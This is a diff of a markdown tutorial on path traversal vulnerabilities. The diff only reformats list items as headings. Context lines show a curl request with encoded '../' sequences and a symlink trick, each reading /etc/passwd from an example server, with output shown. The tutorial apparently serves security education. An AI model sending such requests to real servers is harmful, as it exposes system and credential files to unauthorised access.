@@ -7,7 +7,7 @@ Attackers can use path traversal to access resources such as
 - Config files
 
 ## Methods of Path Traversal
-- Using "../" or some encoded version of it to traverse up the directory and expand scope of access
+### Using "../" or some encoded version of it to traverse up the directory and expand scope of access
 
 ``` zsh
 user@example:~$ curl https://app.example/public/%2e%2e/%2e%2e/etc/passwd
@@ -17,7 +17,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 ```
-- Using a previously created symbolic link to access a sensitive file
+### Using a previously created symbolic link to access a sensitive file
 ``` zsh
 // "ln -s /etc/passwd img1.jpg" previously run
 user@example:~$ curl https://app.example/public/img1.jpg
@@ -27,7 +27,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 ```
-- Using absolute path to access anything starting from the root directory (covered in example)
+### Using absolute path to access anything starting from the root directory (covered in example)
 
 ## Example Exploit
 Our example endpoint takes in a query filename to retrieve a file from  the "static/files" directory.
